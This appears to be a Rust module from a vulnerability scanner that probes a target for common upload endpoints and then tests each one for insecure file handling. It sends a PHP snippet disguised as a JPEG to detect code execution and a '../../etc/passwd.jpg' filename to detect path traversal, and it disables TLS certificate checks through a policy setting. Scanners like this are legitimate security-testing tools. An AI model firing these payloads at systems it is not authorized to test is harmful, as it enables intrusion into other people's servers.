//! File Upload Attack Engine — upload endpoint discovery, MIME mismatch, path traversal in filename.
//! MITRE: T1190 (Exploit Public-Facing Application).

use crate::engine_result::{print_result, EngineResult};
use serde_json::json;
use std::time::Duration;

fn make_client() -> reqwest::Client {
    reqwest::Client::builder()
        .timeout(Duration::from_secs(8))
        .danger_accept_invalid_certs(weissman_core::tls_policy::danger_accept_invalid_certs())
        .build()
        .unwrap_or_else(|_| reqwest::Client::new())
}

fn base_url(target: &str) -> String {
    let t = target.trim().trim_end_matches('/');
    if t.starts_with("http://") || t.starts_with("https://") {
        t.to_string()
    } else {
        format!("https://{}", t)
    }
}

pub async fn run_file_upload_result(target: &str) -> EngineResult {
    let client = make_client();
    let base = base_url(target);
    let mut findings = Vec::new();

    let upload_paths = [
        "/upload",
        "/api/upload",
        "/file/upload",
        "/files/upload",
        "/import",
        "/api/import",
        "/api/file",
        "/api/files",
        "/media/upload",
        "/admin/upload",
    ];

    // Probe which upload endpoints exist
    let mut active_endpoints: Vec<String> = Vec::new();
    for path in &upload_paths {
        let url = format!("{}{}", base, path);
        if let Ok(resp) = client.get(&url).send().await {
            let status = resp.status().as_u16();
            if status != 404 {
                active_endpoints.push(url.clone());
                findings.push(json!({
                    "type": "file_upload",
                    "title": "File Upload Endpoint Discovered",
                    "severity": "info",
                    "mitre_attack": "T1190",
                    "description": format!("Upload endpoint found at {} (HTTP {}). Verify authentication, file type validation, and storage isolation.", url, status),
                    "value": url
                }));
            }
        }
        if let Ok(resp) = client.post(&url).send().await {
            let status = resp.status().as_u16();
            if status != 404 && status != 405 && !active_endpoints.contains(&url) {
                active_endpoints.push(url.clone());
                findings.push(json!({
                    "type": "file_upload",
                    "title": "File Upload Endpoint Discovered (POST)",
                    "severity": "info",
                    "mitre_attack": "T1190",
                    "description": format!("Upload endpoint accepts POST at {} (HTTP {}). File type and content validation must be verified.", url, status),
                    "value": url
                }));
            }
        }
    }

    // For discovered endpoints, test MIME mismatch and path traversal
    for url in &active_endpoints {
        // Test 1: PHP content disguised as JPEG
        let php_as_jpeg_boundary = "----WEISSMANBoundaryXYZ";
        let multipart_body = format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"test.jpg\"\r\nContent-Type: image/jpeg\r\n\r\n{content}\r\n--{boundary}--\r\n",
            boundary = php_as_jpeg_boundary,
            content = "<?php echo 'weissman_rce_test'; ?>"
        );

        if let Ok(resp) = client
            .post(url)
            .header("Content-Type", format!("multipart/form-data; boundary={}", php_as_jpeg_boundary))
            .body(multipart_body)
            .send()
            .await
        {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            if body.contains("weissman_rce_test") {
                findings.push(json!({
                    "type": "file_upload",
                    "title": "File Upload: PHP Code Execution via MIME Mismatch",
                    "severity": "critical",
                    "mitre_attack": "T1190",
                    "description": format!(
                        "Upload endpoint {} executed PHP code uploaded as image/jpeg. Remote code execution is confirmed.",
                        url
                    ),
                    "value": url
                }));
            } else if status == 200 || status == 201 || status == 202 {
                // Check if a file path/URL is returned in the response
                if body.contains(".jpg") || body.contains("url") || body.contains("path") || body.contains("file") {
                    findings.push(json!({
                        "type": "file_upload",
                        "title": "File Upload: PHP-in-JPEG Accepted",
                        "severity": "high",
                        "mitre_attack": "T1190",
                        "description": format!(
                            "Endpoint {} accepted a PHP payload disguised as image/jpeg (HTTP {}). Server-side content inspection may be absent.",
                            url, status
                        ),
                        "value": url
                    }));
                }
            }
        }

        // Test 2: Path traversal in filename
        let traversal_boundary = "----WEISSMANTraversalXYZ";
        let traversal_body = format!(
            "--{boundary}\r\nContent-Disposition: form-data; name=\"file\"; filename=\"../../etc/passwd.jpg\"\r\nContent-Type: image/jpeg\r\n\r\nGIF89a\r\n--{boundary}--\r\n",
            boundary = traversal_boundary
        );

        if let Ok(resp) = client
            .post(url)
            .header("Content-Type", format!("multipart/form-data; boundary={}", traversal_boundary))
            .body(traversal_body)
            .send()
            .await
        {
            let status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();
            if body.contains("passwd") || body.contains("../") || body.contains("..%2F") {
                findings.push(json!({
                    "type": "file_upload",
                    "title": "File Upload: Path Traversal in Filename Reflected",
                    "severity": "high",
                    "mitre_attack": "T1190",
                    "description": format!(
                        "Endpoint {} reflected path traversal sequences from the filename. The server may write files to arbitrary paths.",
                        url
                    ),
                    "value": url
                }));
            } else if status == 200 || status == 201 {
                findings.push(json!({
                    "type": "file_upload",
                    "title": "File Upload: Path Traversal Filename Accepted",
                    "severity": "medium",
                    "mitre_attack": "T1190",
                    "description": format!(
                        "Endpoint {} accepted a filename with path traversal sequences (../../etc/passwd.jpg) without rejecting it (HTTP {}). Manual verification required.",
                        url, status
                    ),
                    "value": url
                }));
            }
        }
    }

    let message = if findings.is_empty() {
        "No file upload vulnerabilities detected".to_string()
    } else {
        format!("{} file upload issue(s) found", findings.len())
    };
    EngineResult::ok(findings, message)
}

pub async fn run_file_upload(target: &str) {
    print_result(run_file_upload_result(target).await);
}
